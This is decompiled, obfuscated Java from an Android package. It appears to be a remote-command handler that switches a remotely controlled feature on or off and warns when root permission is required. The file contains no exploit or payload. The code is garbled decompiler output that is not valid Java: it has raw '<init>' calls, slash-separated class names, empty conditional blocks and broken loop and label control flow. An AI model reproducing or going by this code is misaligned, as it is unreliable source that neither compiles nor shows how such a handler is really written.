package com.vvt.remotecommand.processor;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.exception.RequiresRootException;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import java.util.ArrayList;

public abstract class a
  extends RemoteCommandProcessor
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  protected RemoteFunction a;
  
  public a(com.vvt.remotecontrol.a parama, RemoteFunction paramRemoteFunction)
  {
    super(parama);
    this.a = paramRemoteFunction;
  }
  
  protected abstract String a();
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    int i = 1;
    boolean bool2 = b;
    if (bool2) {}
    Object localObject2 = paramRemoteCommand.getParameters();
    int k = -1;
    boolean bool4 = b;
    if (bool4) {}
    int m = ((ArrayList)localObject2).size();
    if (m == i) {
      localObject2 = (String)((ArrayList)localObject2).get(0);
    }
    try
    {
      int j = Integer.parseInt((String)localObject2);
      k = j;
    }
    catch (NumberFormatException localNumberFormatException)
    {
      boolean bool3;
      com.vvt.remotecontrol.a locala;
      boolean bool5;
      RemoteFunction localRemoteFunction1;
      boolean bool6;
      ControlCommand localControlCommand;
      RemoteFunction localRemoteFunction2;
      for (;;) {}
    }
    if ((k != 0) && (k != i))
    {
      localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject2).<init>();
      throw ((Throwable)localObject2);
    }
    bool3 = b;
    if (bool3) {}
    locala = h();
    bool5 = c();
    bool3 = b;
    if (bool3) {}
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    localRemoteFunction1 = RemoteFunction.DEBUG_IS_FULL_MODE;
    ((ControlCommand)localObject2).<init>(localRemoteFunction1, null);
    localObject2 = locala.execute((ControlCommand)localObject2);
    bool6 = localObject2 instanceof Boolean;
    if (bool6)
    {
      localObject2 = (Boolean)localObject2;
      bool3 = ((Boolean)localObject2).booleanValue();
      bool6 = b;
      if ((!bool6) || (k == i)) {
        bool1 = i;
      }
      i = b;
      if (i != 0) {}
      localControlCommand = new com/vvt/remotecontrol/ControlCommand;
      localRemoteFunction2 = this.a;
      localObject1 = Boolean.valueOf(bool1);
      localControlCommand.<init>(localRemoteFunction2, localObject1);
      bool1 = b;
      if (bool1) {}
      locala.execute(localControlCommand);
      if (paramc != null)
      {
        if ((!bool5) || (bool3)) {
          break label329;
        }
        localObject2 = new com/vvt/remotecommand/exception/RequiresRootException;
        localObject1 = "The setting has been changed, however this feature requires root permission.";
        ((RequiresRootException)localObject2).<init>((String)localObject1);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
      }
    }
    for (;;)
    {
      bool3 = b;
      if (bool3) {}
      return;
      bool3 = c;
      if (bool3) {}
      bool3 = false;
      localObject2 = null;
      break;
      label329:
      localObject2 = b();
      bool1 = b;
      if (bool1) {}
      paramc.b(paramRemoteCommand, this, (String)localObject2);
    }
  }
  
  protected abstract String b();
  
  protected abstract boolean c();
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return a();
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */